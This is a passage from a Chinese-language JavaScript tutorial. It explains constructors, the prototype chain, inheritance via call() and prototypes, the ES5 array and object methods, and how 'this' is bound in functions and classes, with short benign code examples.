title="constructor构造函数"></a>constructor构造函数</h2><p>对象原型（ <code>__proto__</code>）和构造函数（prototype）原型对象里面都有一个属性 constructor 属性 ，constructor 我们称为构造函数，因为它指回构造函数本身。</p><p>constructor 主要用于记录该对象引用于哪个构造函数，它可以让原型对象重新指向原来的构造函数。</p><p>一般情况下，对象的方法都在构造函数的原型对象中设置。如果有多个对象的方法，我们可以给原型对象采取<strong>对象形式赋值</strong>，但是这样就会<strong>覆盖</strong>构造函数原型对象原来的内容，这样修改后的原型对象 constructor 就<strong>不再指向当前构造函数</strong>了。此时，我们可以在修改后的原型对象中，添加一个 constructor 指向原来的构造函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 很多情况下,我们需要手动的利用constructor 这个属性指回 原来的构造函数 </span></span><br><span class="line"><span class="comment">// Star.prototype.sing = function() &#123;</span></span><br><span class="line"><span class="comment">//     console.log(&#x27;我会唱歌&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">// Star.prototype.movie = function() &#123;</span></span><br><span class="line"><span class="comment">//     console.log(&#x27;我会演电影&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">Star.prototype = &#123;</span><br><span class="line">    <span class="comment">// 如果我们修改了原来的原型对象,给原型对象赋值的是一个对象,则必须手动的利用constructor指回原来的构造函数</span></span><br><span class="line">    <span class="attr">constructor</span>: Star,</span><br><span class="line">    <span class="attr">sing</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;我会唱歌&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">movie</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;我会演电影&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数、实例、原型对象三者之间的关系"><a href="#构造函数、实例、原型对象三者之间的关系" class="headerlink" title="构造函数、实例、原型对象三者之间的关系"></a><strong>构造函数、实例、原型对象三者之间的关系</strong></h2><p><img src="https://i.loli.net/2021/06/07/4MQYaFsWUuBK1hf.jpg" alt="Snipaste_2021-06-07_09-46-34.jpg"></p><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(Star.prototype);<span class="comment">//Object</span></span><br><span class="line">                            <span class="comment">// sing: ƒ ()</span></span><br><span class="line">                            <span class="comment">// constructor: ƒ Star(uname, age)</span></span><br><span class="line">                            <span class="comment">// __proto__: Object</span></span><br><span class="line"><span class="built_in">console</span>.log(Star.prototype.__proto__ === <span class="built_in">Object</span>.prototype);<span class="comment">//true</span></span><br><span class="line"><span class="comment">// 2.我们Star原型对象里面的__proto__原型指向的是 Object.prototype</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.__proto__);<span class="comment">//null</span></span><br><span class="line"><span class="comment">// 3. 我们Object.prototype原型对象里面的__proto__原型  指向为 null</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/07/XdFVuiIo1hE6e4J.jpg" alt="Snipaste_2021-06-07_09-49-53.jpg"></p><h2 id="JavaScript-的成员查找机制-规则"><a href="#JavaScript-的成员查找机制-规则" class="headerlink" title="JavaScript 的成员查找机制(规则)"></a><strong>JavaScript</strong> <strong>的成员查找机制</strong>(规则)</h2><ol><li>当访问一个对象的属性（包括方法）时，<strong>首先</strong>查找这个对象自身有没有该属性。</li><li>如果没有就查找它的原型（也就是 __proto__指向的 prototype 原型对象）。</li><li>如果还没有就查找原型对象的原型（Object的原型对象）。</li><li>依此类推一直找到 Object 为止（null）。</li><li><code>__proto__</code>对象原型的意义就在于为对象成员查找机制提供一个方向，或者说一条路线。</li></ol><h2 id="原型对象this指向"><a href="#原型对象this指向" class="headerlink" title="原型对象this指向"></a><strong>原型对象</strong>this指向</h2><p>构造函数中的this 指向我们实例对象.</p><p><strong>原型对象</strong>里面放的是方法, 这个方法里面的<strong>this 指向</strong>的是 这个方法的<strong>调用者</strong>, 也就是这个<strong>实例对象.</strong></p><h2 id="扩展内置对象"><a href="#扩展内置对象" class="headerlink" title="扩展内置对象"></a><strong>扩展</strong>内置对象</h2><p>可以通过原型对象，对原来的内置对象进行扩展自定义的方法。比如给数组增加自定义求偶数和的功能。</p><blockquote><p>注意：数组和字符串内置对象<strong>不能给原型对象覆盖操作</strong> Array.prototype = {} ，只能是 Array.prototype.xxx = function(){} 的方式。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.sum = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        sum += <span class="built_in">this</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.sum()); <span class="comment">// 6</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.prototype); <span class="comment">// 能找到sum方法</span></span><br><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1.sum()); <span class="comment">// 66</span></span><br></pre></td></tr></table></figure><hr><h1 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h1><p>ES6之前并没有给我们提供 extends 继承。我们可以通过<strong>构造函数+原型对象</strong>模拟实现继承，被称为<strong>组合继承</strong>。</p><h2 id="call"><a href="#call" class="headerlink" title="call()"></a>call()</h2><p>调用这个函数, 并且修改函数运行时的 this 指向  </p><p><code>fun.call(thisArg, arg1, arg2, ...) </code></p><ul><li>lthisArg ：当前调用函数 this 的指向对象</li><li>larg1，arg2：传递的其他参数</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(x + y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;andy&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// call() 可以改变这个函数的this指向 此时这个函数的this 就指向了o这个对象</span></span><br><span class="line">fn.call(o, <span class="number">1</span>, <span class="number">2</span>);   <span class="comment">//&#123;name:&#x27;andy&#x27;&#125;</span></span><br><span class="line">                    <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="借用构造函数继承父类型属性"><a href="#借用构造函数继承父类型属性" class="headerlink" title="借用构造函数继承父类型属性"></a><strong>借用构造函数继承父</strong>类型属性</h2><p>核心原理： 通过 call() 把父类型的 this 指向子类型的 this ，这样就可以实现子类型继承父类型的属性。  </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 借用父构造函数继承属性</span></span><br><span class="line"><span class="comment">// 1. 父构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">uname, age</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this 指向父构造函数的对象实例</span></span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2 .子构造函数 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">uname, age, score</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this 指向子构造函数的对象实例</span></span><br><span class="line">    Father.call(<span class="built_in">this</span>, uname, age);</span><br><span class="line">    <span class="built_in">this</span>.score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son(<span class="string">&#x27;刘德华&#x27;</span>, <span class="number">18</span>, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">console</span>.log(son); <span class="comment">// Son &#123;uname: &quot;刘德华&quot;, age: 18, score: 100&#125;</span></span><br></pre></td></tr></table></figure><h2 id="借用原型对象继承父类型方法"><a href="#借用原型对象继承父类型方法" class="headerlink" title="借用原型对象继承父类型方法"></a><strong>借用原型对象继承</strong>父<strong>类型方法</strong></h2><p>一般情况下，对象的方法都在构造函数的原型对象中设置，通过构造函数无法继承父类方法。 </p><p> 核心原理： </p><ol><li>将子类所共享的方法提取出来，让子类的 prototype 原型对象 = new 父类() </li><li>本质：子类原型对象等于是实例化父类，因为父类实例化之后另外开辟空间，就不会影响原来父类原型对象</li><li>将子类的 constructor 从新指向子类的构造函数</li></ol><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 父构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">uname, age</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this 指向父构造函数的对象实例</span></span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">Father.prototype.money = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">100000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 2 .子构造函数 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">uname, age, score</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this 指向子构造函数的对象实例</span></span><br><span class="line">    Father.call(<span class="built_in">this</span>, uname, age);</span><br><span class="line">    <span class="built_in">this</span>.score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Son.prototype = Father.prototype;  这样直接赋值会有问题,如果修改了子原型对象,父原型对象也会跟着一起变化</span></span><br><span class="line"><span class="comment">// 实例化一个Father对象</span></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father();</span><br><span class="line"><span class="comment">// 如果利用对象的形式修改了原型对象,别忘了利用constructor 指回原来的构造函数</span></span><br><span class="line">Son.prototype.constructor = Son;</span><br><span class="line"><span class="comment">// 这个是子构造函数专门的方法</span></span><br><span class="line">Son.prototype.exam = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;孩子要考试&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son(<span class="string">&#x27;刘德华&#x27;</span>, <span class="number">18</span>, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">console</span>.log(son); <span class="comment">// Son &#123; age: 18, score: 100, uname: &quot;刘德华&quot;, __proto__: Father &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(Father.prototype); <span class="comment">// 有 money 方法，无 exam 方法</span></span><br><span class="line"><span class="built_in">console</span>.log(Son.prototype.constructor); <span class="comment">// 指向Son</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/07/HfRFt4dpGuSsKVT.jpg" alt="Snipaste_2021-06-07_10-23-58.jpg"></p><h2 id="类的本质"><a href="#类的本质" class="headerlink" title="类的本质"></a><strong>类的本质</strong></h2><ol><li>class本质还是function.所以我们可以认为类就是构造函数的另一种写法</li><li>类有原型对象prototype，里面有constructor 指向类本身。并且类的所有方法都定义在类的prototype属性上</li><li>类创建的实例对象里面也有<code>__proto__ </code>原型指向类的prototype原型对象</li><li>类也可以通过原型对象添加方法</li><li>ES6的类其实就是语法糖:语法糖就是一种便捷写法.  简单理解, 有两种方法可以实现同样的功能, 但是一种写法更加清晰、方便,那么这个方法就是语法糖</li></ol><hr><h1 id="ES5-中的新增方法"><a href="#ES5-中的新增方法" class="headerlink" title="ES5 中的新增方法"></a>ES5 中的新增方法</h1><h2 id="数组方法"><a href="#数组方法" class="headerlink" title="数组方法"></a><strong>数组方法</strong></h2><p>迭代(遍历)方法：forEach()、map()、filter()、some()、every()；</p><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach()"></a>forEach()</h3><p><code>array.forEach(function(currentValue, index, arr))</code></p><ul><li>lcurrentValue：数组当前项的值</li><li>lindex：数组当前项的索引</li><li>larr：数组对象本身</li></ul><h3 id="filter"><a href="#filter" class="headerlink" title="filter()"></a>filter()</h3><p><code>array.filter(function(currentValue, index, arr))</code></p><ul><li><p>filter() 方法创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素,主要用于筛选数组</p></li><li><p>注意它直接返回一个<strong>新数组</strong></p></li><li><p>currentValue: 数组当前项的值</p></li><li><p>index：数组当前项的索引</p></li><li><p>arr：数组对象本身</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">12</span>, <span class="number">66</span>, <span class="number">4</span>, <span class="number">88</span>, <span class="number">3</span>, <span class="number">7</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">value, index</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value % <span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(newArr); <span class="comment">// [ 12,66,4,88 ]</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="some"><a href="#some" class="headerlink" title="some()"></a>some()</h3><p><code>array.some(function(currentValue, index, arr))</code></p><ul><li>some() 方法用于检测数组中的元素是否满足指定条件.  通俗点 查找数组中是否有满足条件的元素 </li><li>注意它返回值是<strong>布尔值</strong>, 如果查找到这个元素, 就返回true ,  如果查找不到就返回false.</li><li>如果找到第一个满足条件的元素,则终止循环. 不在继续查找.</li><li>currentValue: 数组当前项的值</li><li>index：数组当前项的索引</li><li>arr：数组对象本身</li></ul><blockquote><p>forEach()与some()区别：</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;pink&#x27;</span>];</span><br><span class="line"><span class="comment">// 1. forEach迭代 遍历</span></span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="string">&#x27;green&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;找到了该元素&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 在forEach 里面 return 不会终止迭代</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 如果查询数组中唯一的元素, 用some方法更合适</span></span><br><span class="line">arr.some(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="string">&#x27;green&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;找到了该元素&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//  在some 里面 遇到 return true 就终止遍历 迭代效率更高</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="string">&#x27;green&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;找到了该元素&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//  // filter 里面 return 不会终止迭代</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map()"></a>map()</h3><p><code>array.map(function(currentValue, index, arr), thisValue)</code></p><p><code>map()</code> 方法返回一个<strong>新数组</strong>，数组中的元素为原始数组元素调用函数处理后的值。和forEach相似，不同在于：</p><p> 如果更改数组内的值，<code>forEach</code> 不能确保数组的不变性。这个方法只有在你不接触里面的任何值时，才能保证不变性。</p><p> 由于它们之间的主要区别在于是否有返回值，所以你会希望使用 <code>map</code> 来制作一个新的数组，而使用 <code>forEach</code> 只是为了映射到数组上(修改原来的数组)。</p><p><strong>返回值加入新数组中</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> newarr = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">value, index</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value * <span class="number">2</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>map的不变性：当数组为基础类型时原数组不变</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">let</span> newArray=array.map(<span class="function">(<span class="params">item</span>) =&gt;</span> item*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(array); <span class="comment">// [1,2,3,4,5]</span></span><br><span class="line"><span class="built_in">console</span>.log(newArray);<span class="comment">//[2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><p><strong>当数组为引用类型时原数组发生改变：</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array = [&#123; <span class="attr">name</span>: <span class="string">&#x27;Anna&#x27;</span>, <span class="attr">age</span>: <span class="number">16</span> &#125;, &#123; <span class="attr">name</span>: <span class="string">&#x27;James&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;]</span><br><span class="line"><span class="keyword">let</span> newArray=array.map(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    item.like=<span class="string">&#x27;eat&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(array); <span class="comment">// [&#123; name: &#x27;Anna&#x27;, age: 16,like: &quot;eat&quot;&#125;,&#123; name: &#x27;James&#x27;, age: 18,like: &quot;eat&quot;&#125;]</span></span><br><span class="line"><span class="built_in">console</span>.log(newArray);<span class="comment">//[&#123; name: &#x27;Anna&#x27;, age: 16,like: &quot;eat&quot;&#125;,&#123; name: &#x27;James&#x27;, age: 18,like: &quot;eat&quot;&#125;]</span></span><br></pre></td></tr></table></figure><h3 id="every"><a href="#every" class="headerlink" title="every()"></a>every()</h3><p><code>array.every(function(currentValue, index, arr), thisValue)</code></p><p><code>every()</code> 方法用于检测数组所有元素是否都符合指定条件</p><h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce()"></a>reduce()</h3><p><code>arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])</code></p><ul><li>callback：回调函数</li><li>initialValue：初始值</li></ul><p><strong>对数组中所有内容进行汇总，点像递归</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> total = a.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">preValue, currValue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preValue + currValue;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 遍历到第一次时，preValue为初始值，currValue为数组里的第一个值</span></span><br><span class="line"><span class="comment">// 遍历到第二次时，preValue为第一次返回的值，currValue为数组里第二个数</span></span><br></pre></td></tr></table></figure><h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><p>trim() 方法会从一个字符串的两端删除空白字符。trim() 方法并不影响原字符串本身，它返回的是一个新的字符串。</p><p><code>str.trim()</code></p><h2 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a><strong>对象</strong>方法</h2><h3 id="Object-keys"><a href="#Object-keys" class="headerlink" title="Object.keys()"></a>Object.keys()</h3><p>Object.keys() 用于获取对象自身所有的属性</p><p><code>Object.keys(obj)</code></p><ul><li>效果类似 for…in</li><li>返回一个由属性名组成的数组</li></ul><h3 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h3><p>Object.defineProperty() 定义对象中新属性或修改原有的属性。(了解)</p><p><code>Object.defineProperty(obj, prop, descriptor)</code></p><ul><li>obj：必需。目标对象 </li><li>prop：必需。需定义或修改的属性的名字</li><li>descriptor：必需。以对象形式 { } 书写:<ul><li>value: 设置属性的值 默认为undefined</li><li>writable: 值是否可以重写。true | false 默认为false</li><li>enumerable: 目标属性是否可以被枚举。true | false 默认为 false</li><li>configurable: 目标属性是否可以被删除或是否可以再次修改特性 true | false 默认为false</li></ul></li></ul><hr><h1 id="函数的定义和调用"><a href="#函数的定义和调用" class="headerlink" title="函数的定义和调用"></a>函数的定义和调用</h1><h2 id="函数的定义方式"><a href="#函数的定义方式" class="headerlink" title="函数的定义方式"></a><strong>函数的定义方式</strong></h2><ol><li>函数声明方式 function 关键字 (命名函数)  <code>function fn() &#123;&#125;;</code></li><li>函数表达式 (匿名函数)  <code>var fun = function() &#123;&#125;;</code></li><li>new Function(‘参数1’,’参数2’, ‘函数体’)  <strong>（了解就行）</strong></li><li>所有函数都是 Function 的实例(对象) </li><li>函数也属于对象</li></ol><h2 id="函数的调用方式"><a href="#函数的调用方式" class="headerlink" title="函数的调用方式"></a><strong>函数的</strong>调用<strong>方式</strong></h2><ol><li><p>普通函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">//something </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对象的方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="attr">sayHi</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//somethin</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">o.sayHi();</span><br></pre></td></tr></table></figure></li><li><p>构造函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Star</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">new</span> Star();</span><br></pre></td></tr></table></figure></li><li><p>绑定事件函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;   <span class="comment">// 点击了按钮就可以调用这个函数</span></span><br></pre></td></tr></table></figure></li><li><p>定时器函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;, <span class="number">1000</span>);  <span class="comment">//这个函数是定时器自动1秒钟调用一次</span></span><br></pre></td></tr></table></figure></li><li><p>立即执行函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//something</span></span><br><span class="line">&#125;)();  <span class="comment">// 立即执行函数是自动调用</span></span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="函数内-this-的指向"><a href="#函数内-this-的指向" class="headerlink" title="函数内 this 的指向"></a><strong>函数</strong>内 <strong>this</strong> <strong>的</strong>指向</h1><p>这些 this 的指向，是当我们调用函数的时候确定的。 调用方式的不同决定了this 的指向不同.一般指向我们的调用者.</p><p><img src="https://i.loli.net/2021/06/07/BtNE9pdsyIrq6wk.jpg" alt="Snipaste_2021-06-07_11-16-40.jpg"></p><p>但是立即执行函数还得看这时this是否在对象方法或者构造函数中，第二个虽然是立即执行函数，但是它先找的是全局变量foo，再找到foo.bar，所以this返回的是foo作用域的a</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">bar</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(foo.bar());            <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log((foo.bar)());          <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log((foo.bar=foo.bar)());  <span class="comment">//1</span></span><br></pre></td></tr></table></figure><p><strong>“匿名函数的执行环境具有全局性”</strong>，所以最里层那个函数中this指向全局环境，全局环境没有定义foo变量所以输出undefined。在匿名函数外部将this保存到一个内部函数可以访问的变量self中，可以通过self访问这个对象，所以self.foo为bar</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myobject = &#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="attr">func</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.foo);</span><br><span class="line">        <span class="built_in">console</span>.log(self.foo);</span><br><span class="line"></span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.foo);<span class="comment">//undefined</span></span><br><span class="line">            <span class="built_in">console</span>.log(self.foo);<span class="comment">//bar</span></span><br><span class="line">        &#125;)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">myobject.func();</span><br></pre></td></tr></table></figure><h2 id="类的this指向"><a href="#类的this指向" class="headerlink" title="类的this指向"></a>类的this指向</h2><p>类的方法内部如果含有<code>this</code>，它默认指向类的实例。但是，必须非常小心，一旦单独使用该方法，很可能报错。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">printName</span>(<span class="params">name = <span class="string">&#x27;there&#x27;</span></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.print(<span class="string">`Hello <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">print</span>(<span class="params">text</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="keyword">const</span> &#123; printName &#125; = logger;</span><br><span class="line">printName(); <span class="comment">// TypeError: Cannot read property &#x27;print&#x27; of undefined</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>printName</code>方法中的<code>this</code>，默认指向<code>Logger</code>类的实例。但是，<strong>如果将这个方法提取出来单独使用</strong>，<code>this</code>会指向该方法运行时所在的环境（由于 class 内部是严格模式，所以 this 实际指向的是<code>undefined</code>），从而导致找不到<code>print</code>方法而报错。</p><p>（1）一个比较简单的解决方法是，在构造方法（constructor）中绑定<code>this</code>，这样就不会找不到<code>print</code>方法了。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.printName = <span class="built_in">this</span>.printName.bind(<span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）另一种解决方法是使用箭头函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Obj</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.getThis = <span class="function">() =&gt;</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> myObj = <span class="keyword">new</span> Obj();</span><br><span class="line">myObj.getThis() === myObj <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="改变函数内部-this-指向"><a href="#改变函数内部-this-指向" class="headerlink" title="改变函数内部 this 指向"></a><strong>改变</strong>函数<strong>内部</strong> <strong>this</strong> <strong>指向</strong></h2><p>JavaScript 